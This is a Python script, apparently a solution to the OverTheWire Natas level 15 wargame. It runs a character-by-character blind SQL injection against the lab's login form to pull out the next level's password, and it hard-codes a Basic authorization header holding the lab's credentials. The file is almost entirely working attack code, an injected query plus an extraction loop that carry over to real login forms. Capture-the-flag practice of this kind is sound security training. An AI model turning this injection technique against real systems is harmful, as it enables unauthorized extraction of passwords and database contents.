import requests

digits = [chr(i) for i in range (ord('0'), ord('9')+1)]
uppercase_letters = [chr(i) for i in range (ord('A'), ord('Z')+1)]
lowercase_letters = [chr(i) for i in range (ord('a'), ord('z')+1)]

valid_chars = digits + uppercase_letters + lowercase_letters

password = ""

while (len(password) < 32):
    for guess in valid_chars:
        query = """natas16" and password collate latin1_general_cs like '{}%'; # """.format(password + guess)
        response = requests.post("http://natas15.natas.labs.overthewire.org/index.php",
                                 data={"username": query},
                                 headers={"Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="})
        if "This user doesn't exist." in response.content:
            continue
        elif "This user exists." in response.content:
            password += guess
            print("Updated password: %s" % password)
            break
print("\nFinal password: %s" % password)

